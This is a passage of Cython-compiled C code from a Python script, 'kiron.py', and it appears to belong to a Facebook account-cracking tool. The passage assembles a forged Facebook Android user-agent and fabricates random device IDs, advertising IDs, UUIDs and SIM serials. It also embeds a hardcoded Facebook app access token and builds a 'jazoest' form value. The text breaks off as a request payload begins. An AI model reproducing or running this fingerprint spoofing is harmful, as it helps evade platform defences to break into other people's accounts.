        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_build); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBAN); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fban); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBAV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fbav); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBBV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fbbv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBDM_density_2_625_width_1080_h); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fblc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBRV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_randint); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_tuple__82, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_t_18); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBCR); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbcr); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBMF); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbmf); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBBD); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbbd); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBPN); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbpn); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBDV); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbdv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBSV); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbsv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBOP_19_FBCA); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbca); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s__83); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_t_18);
        __pyx_t_18 = 0;

        /* "kiron.py":497
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()             # <<<<<<<<<<<<<<
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 497, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_Random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 497, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
          __pyx_t_18 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 497, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_random_seed, __pyx_t_18);
        __pyx_t_18 = 0;

        /* "kiron.py":498
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))             # <<<<<<<<<<<<<<
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())
 */
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_v_random_seed, __pyx_n_s_choices); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_string); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_hexdigits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_5);
        if (__Pyx_PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_5)) __PYX_ERR(0, 498, __pyx_L3_error);
        __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_k, __pyx_int_16) < 0) __PYX_ERR(0, 498, __pyx_L3_error)
        __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyString_Join(__pyx_kp_s__63, __pyx_t_12); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_adid, __pyx_t_12);
        __pyx_t_12 = 0;

        /* "kiron.py":499
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_uuid); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 499, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 499, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
          __pyx_t_12 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 499, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 499, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF_SET(__pyx_v_device_id, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":500
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_uuid); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_12, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 500, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_secure, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":501
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 501, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 501, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_4, NULL};
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 501, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __pyx_t_12 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 501, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_family, __pyx_t_12);
        __pyx_t_12 = 0;

        /* "kiron.py":502
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'             # <<<<<<<<<<<<<<
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'
 */
        __Pyx_INCREF(__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
        __Pyx_DECREF_SET(__pyx_v_accessToken, __pyx_kp_s_350685531728_62f8ce9f74b12f84c12);

        /* "kiron.py":503
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))             # <<<<<<<<<<<<<<
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']
 */
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_random_seed, __pyx_n_s_choices); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 503, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_string); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 503, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_digits); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 503, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 503, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_4);
        if (__Pyx_PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4)) __PYX_ERR(0, 503, __pyx_L3_error);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 503, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_k, __pyx_int_20) < 0) __PYX_ERR(0, 503, __pyx_L3_error)
        __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 503, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyString_Join(__pyx_kp_s__63, __pyx_t_18); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 503, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 503, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_xd, __pyx_t_18);
        __pyx_t_18 = 0;

        /* "kiron.py":504
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'             # <<<<<<<<<<<<<<
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 */
        __pyx_t_18 = PyTuple_New(3); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 504, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_22 = 0;
        __pyx_t_8 = 127;
        __Pyx_INCREF(__pyx_kp_u__84);
        __pyx_t_22 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__84);
        PyTuple_SET_ITEM(__pyx_t_18, 0, __pyx_kp_u__84);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_xd, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 504, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_8;
        __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_18, 1, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u__85);
        __pyx_t_22 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__85);
        PyTuple_SET_ITEM(__pyx_t_18, 2, __pyx_kp_u__85);
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_18, 3, __pyx_t_22, __pyx_t_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 504, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_XDECREF_SET(__pyx_v_sim_serials, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "kiron.py":505
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']             # <<<<<<<<<<<<<<
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))
 */
        __pyx_t_4 = PyList_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 505, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_kp_s_28);
        __Pyx_GIVEREF(__pyx_kp_s_28);
        if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 0, __pyx_kp_s_28)) __PYX_ERR(0, 505, __pyx_L3_error);
        __Pyx_INCREF(__pyx_kp_s_29);
        __Pyx_GIVEREF(__pyx_kp_s_29);
        if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 1, __pyx_kp_s_29)) __PYX_ERR(0, 505, __pyx_L3_error);
        __Pyx_INCREF(__pyx_kp_s_210);
        __Pyx_GIVEREF(__pyx_kp_s_210);
        if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 2, __pyx_kp_s_210)) __PYX_ERR(0, 505, __pyx_L3_error);
        __Pyx_XDECREF_SET(__pyx_v_li, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "kiron.py":506
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)             # <<<<<<<<<<<<<<
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))
 *                         jazoest = li2+j1
 */
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_random); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 506, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_choice); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 506, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_18, __pyx_v_li};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 506, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_li2, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":507
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */
